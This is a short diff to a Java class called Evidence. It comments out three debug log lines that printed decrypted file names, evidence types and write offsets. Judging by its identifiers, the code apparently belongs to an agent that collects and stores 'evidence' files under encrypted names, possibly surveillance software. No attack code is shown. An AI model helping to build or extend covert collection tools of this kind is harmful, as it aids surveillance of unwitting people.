@@ -165,7 +165,7 @@ final class Evidence {
 
 		if (fconn != null && fconn.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (close): " + EvidenceCollector.decryptName(fconn.getName()));
+				//Check.log(TAG + " (close): " + EvidenceCollector.decryptName(fconn.getName()));
 			}
 			ret = fconn.dropExtension(EvidenceCollector.LOG_TMP);
 			if (!ret) {
@@ -273,7 +273,7 @@ final class Evidence {
 				return false;
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Created " + evidenceType + " : " + name.fileName);//$NON-NLS-1$ //$NON-NLS-2$
+				//Check.log(TAG + " Created " + evidenceType + " : " + name.fileName);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			final byte[] plainBuffer = makeDescription(additionalData, evidenceType);
 			if (Cfg.DEBUG) {
@@ -399,7 +399,7 @@ final class Evidence {
 	 */
 	public synchronized boolean writeEvidence(final byte[] data, final int offset) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (writeEvidence) len: " + data.length + " offset: " + offset);
+			//Check.log(TAG + " (writeEvidence) len: " + data.length + " offset: " + offset);
 		}
 		
 		if (!enoughSpace) {
